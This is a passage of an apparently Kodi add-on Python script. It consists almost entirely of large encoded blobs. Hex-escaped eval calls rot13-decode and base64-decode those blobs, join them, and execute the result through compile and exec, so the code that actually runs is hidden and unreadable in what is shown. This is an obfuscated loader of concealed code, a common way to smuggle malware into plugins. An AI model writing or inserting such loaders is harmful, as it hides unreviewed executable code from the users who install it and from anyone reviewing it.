E0MjRmMzAzOTY3NDYyZjMwNmYzMTQ0NDU2NzU3NGQyZjRiNmI0ZjM3NTg2ZTMzNDY2NjM3NTk3MzVhNTk1MzRlNzI1ODRjNDI0ODU3NmQ2NDZlNjQ2OTcxNzkyYjU0MmI2ZTRiMzI3MzU1MzI2ZTRjNzk0NjQ0NDY2YzY5NDY0ODU2NjE0MzUwNzQ0MjM4NDI3OTc1Njc2NjZiNGEzMjUyNTU1MTMyNGY2NjQ1NDgyYjY3NjQyZjYyNDc1NTYzNGU1YTQxNTE2YjM2MzMzMjQyMmI1MTY2NjkzNDRhMmY3ODUyNDU1YTRiNTA0MjZjNzg0MTZjMzI3NzY2MmI0YjcxNGEyZjM3NTIyYjMxMzgyZjc4NzM0ZTM4NDM2YTY3NmI2Zjc4NjU2NDJiNDk2YzZlNGY0YzRhNTg0NTU0NGQ1ODQ1NmY2MzUwNmM3MjUxMzQ3MDU5NTc0YzM3Mzk2ZDY5NmMzMzc4NGQ0ZjY0NGI1MzQ1MzczODZiNDQ3MzYxNGQzNTMxNTg2NjYzNmQ1NTYzNGY0ODUzNTM2ZTc3NTE3MjJmNzI1OTc5NTM3MzQ0NTc0ZTMxNzU1MDZhNGM0ZDYzNjQzNTRlNTc0NjU4NDYzMzRhNjE0ZTZiNzQ0NzYzNmE2MzZkNjU2MzMxNTkzNzY3NDQ1YTJiNGM1MDQyNmQzMzRmNDUzNzQyMmI0YzcxNTM0ZDUzNzc1YTJmNTI0NjM5NmI2YjJmNzU1MzMzMzU2OTY5NTU0ZjQzMzY3ODc3Nzg2YjZlNzk0ZTRjNTMzNzU2NTAzMDY1NzU0YjQzNGQ1OTc4NGQ2NDU0NmEzMTY2Mzk2OTQyNjY2Yzc5NmE2MTY2MzU0YjQzNGY1OTRiNjE3MzdhN2E3OTUzMzg1YTc0Nzg1NTc1NTE0NzRmNmQ1NjMwNzczNTVhNzg0MTRiMzU1MDU4NTg2NDY2NTk3NzM5NzM1MDY2NjM3NDU5NTkzNzUxNTc1NjM5NzgyZjY0NmQ1MDc2NGQ0Mjc1Nzg1MDM5NmY3MjM0NzE2YTRmNjQ0YTcxNTg2ZTZhNDY1NjMxNzg2ZTMyMzE3MjM4NzA3MDc4NGM1MzdhNGM2YTc5NDk0MTZjNGM2MzY4NzUzMTU5MmY2ZDc5NDU2ODcyNTAzODcxMzQzNjQ1NjY3NTJiNmM0NjRiNDc1MTU3NmM1NDY4NmQ0ODY2MzM0MTZiMzA2ODVhNjUzMjRkNWE2YzU4Njk2MjJiNTQ2YTc5NDk0YTU5MmI1MjQ1NTEyZjM2NGIzMDY2MzM1YTQyNTI0ZTQ1NWEzODM1NjU3NTZhNGIzNjRiNDg3NzUyMzM2YjQ0NTAzOTRhMmI2YzQ5NzQyYjUyNmE3OTYyNzkzODY5NDYzNjU1NjU0MzMwNmEzNDc2Mzc3NjU1NzM0OTMxNTM0ZDczMzU0MjcyMzI1OTM4NjM3MDY4Nzk2NDRiNTc1NDQ1NTM2NjRhNDM2YTZhNzc1MTU4Mzg1MzRmNTk0MzY1NTE2ZDM1Nzc0YzVhNGY1MzUzNDk3NzU2NzM2NzU5NGEyZjZhMmY2ZDM2Nzg0YjczMmIzNzc2NTE3NDY2NGM3NTMzNDc2NjZmNTkzODMxNmU2OTUwMzcyZjZhNjk0MjRjN2E0YzQ3NmU2NDRmNzQ0YzYxNTA2NDQ1MmYyYjM1NDY1YTc3NjQ3MjY1NDg2NzY0Mzk0MzdhNzE1NzJmNDQyYjU4NmM2OTM1NjI2YzM2NDk0ODc0Mzg2NDRlMzU2YTZlNGQ2ZDM5Njk0ZjM1NjY2ZDQ1NjU1MjM5NDg0YzY4NmI0ODRmNjE0YTUzNzU0NzRiNjY2YjcwMzg3OTM3MmY0ZjVhNGM3NzMzMzc0ZTY2NzIzODcyNDIyYjMzMzg2MjM5NDc0ZTRmNGYyYjU2NjM3MjUyNTE2MzZlNzYyZjQ0Mzc3NTZlNTQ2NzM2NGE3NjY4NzM2OTM5Nzk1OTZhMzk0ZDJmNTUzNzYyMzIzNjYxNjU0MzU0N2E0OTM2NGM0MzRkNGE1MDRkMzk3NzQyNDk1MjM1MzE2ZjZjNzk2ZjY4Mzk0OTMzNzY2NzMxNDU3NTRkMzc0ZDZiNDk1OTYzNGQ1MjUxNTI3MTU1MzQzMDY5NGY3NDY2Nzg2YjZjNmIyZjc5NmM0ODJiNDg0OTYxNDE0ZjUzNTkzODcyNDk1YTM0MmI2Njc4NDE3NjZkNzIzMjQ5MmY2YjZlNGQ3YTU4MmYzNzc5NTM3ODZlNTI0OTZkMzUzMDY2NTY3NTU5NjY2OTMyNmE2YTZmMzc2NzRiNTA0ZDcwMzQ0ZTU0NjkzNjMxNzg2YTVhNDQ3ODUzNTc1NDM5NjI3OTdhNGM0YjRhNjY2ZDQ0NGM1MzRlNDE0ODRjNTc1MjQ1NTQ3NjY5NDI0ZDM5NDI1ODc5NGUzNDQ4NGM1NTRjNzM3MTJiNTc1MDZlNDcyYjQ3NDk3MjY2NzM0YjU1NzY0OTc3NzU3Mjc0NmQyZjQ2NGQzMzJiNmI2ZTZjNjQ1MzQzNDc0YjYzNmI2ZTRkNTYyZjYyNTU3OTYzNjk2MjczNzgzODY4MzQ1MDY4NDEzNzM2NmI2NTZhNzg0OTJmMzg2NjZhNTEzMDM1NTE2ODRlNzg2ODQ3NDkzMzY4MzcyYjQ4NDYzMzY4NzU1NTU3Nzc2NzJiNjU0MTJmNDM2ODMwNTM2ZTc5NTI1NzUwNmU2ZjUyMmIzNzZmN2EzODUyNjQ2YjYyNGY0ZDY0NTA1MTZhNjI3MzdhNDI2ZDY1NjU1MTRjMmYzMDU0NTA3ODYyMzk3NTYzNDM1MjU1NTMzNzY3NzM0OTc3MzI1MzcxN2E2ZDRmNTk3NTZhNGYzNzUyNDQ1ODM4NjE2ODM1N2E3NzUwNTMzNTM3NDEyZjQ1NmE2YjYyNmI3NDJiNDU2YTQxNTA2Yjc0NDY0ZjZlNzQ2NTY1MmY1NTY5NjY2YTRiMzYzNjY2NjYzNDcwMzQzMDZiNDQ2NTYzMzY'
keymaker = 'mAQp4ZmZ0AGD5AzV1AQWzAzZ3LGD4Awp3ZwD5ZmH2Mwp5Zmt2BGD5AzR0LGpjAGp0MQL3AQt1ZQHkAmH0ZwZ4AGV0AQD1AGR3AwEuAwH0BGH1ZmL0AwMuATV1ZQMuATR0ZmEvAGt0LmMvAwx0LGD4AmH2ZmZlZmH2AmD5ZmN2ZmL4ATL1BGEvAwR1ZmHkZmp0AQLmAmp1LGD4AzH2MGp5ZmZ3LGquAQtmAGD4Amt2LmMyAwD2Awp2Zmt2MQZ2ATH3ZwWvAwHlLwWzZzL2LmEwAmHmZwZlAmN2ZwZ3AzDlLwpmAQV1AQquA2RmAwp1AzD3ZGEzATR2AGWvZzL3LGL4Awp3LGLkAGtlLwZ2AmH2MQp5AGV3ZmHjAwR3LGEyATL1Amp1AmZ1AmD0AGN2AwpkAwR1ZQL0AQL0LwLmAGp1BGL3AJR1AmWzAGD0AmZ2AmR0BQIuZzV1AmHjZmZ0MwZkAmV0LwpjZmp0AwZlAzL1ZGEvAwZ2Lwp0ATR0AQZkAmV2AwMwAwD1ZwDkAGN0LwquZzV3BQD0ZmZ1AQpmAmV2AGH5AmZ3BQLlAQD0BQp2AQR2LGHjZmL2MQEzAwL1AwMwAGN2ZGL5AQDmAGD5Zmt1AQWvAzL1AQEyAzD1BQquZmZlLwLmAGN0MwZ0AmH2ZGp0ZmDmAwL2AwRmBGH2AwHmAmEwZmp3LGquATZ2ZmEwAGx2AmMwAGt1AwL0Zmx2MQWvAQL2MGL5AmRmZQIuAwt1AwZ3AzH2LGMwAmV0LmMxAwH2BQMuZmp0MQD3AzRmBGD0ATL0BQZ2AGRlMwplAGN0LwH5ZmpmBQZjAwZmBGMxAQD3BQMuAwp3ZmZ2AQV3ZGplZmL0BGEwZmxmBGH4ZmpmZQEvAGDmBGEuAGDmAGWzAwH1ZQMxAzRmZGZmAwtmAmZkZmZmBQD0ATL1ZGMyAzRmBGZ3ZzL0MGH3ZmL2LwMuAzD0ZmLkAQp2MGMwAQL1AQp1AGZ2AwD3AwL1AQpmAGp2ZGH2AmZmAwLlAzV0LmD2ZmVmAGquZmRmAQp4AwHmAmpmAwxmZGWzAQZ3ZmL3AmN0ZwZjAGZmZwZkATZ2AGDkAGL2Amp5AQV3BQD0AmD0MwHmATD3AmMvAQV2MQEuZmx2BQMuAQD1LGIuZmx3LGHmAzR2AmZ3AQx0LmWzZmp0AmLmAQp0BGEvATH2MwZ2AwL1ZGZkATH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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

if __name__ == '__main__':
    router(sys.argv[2][1:])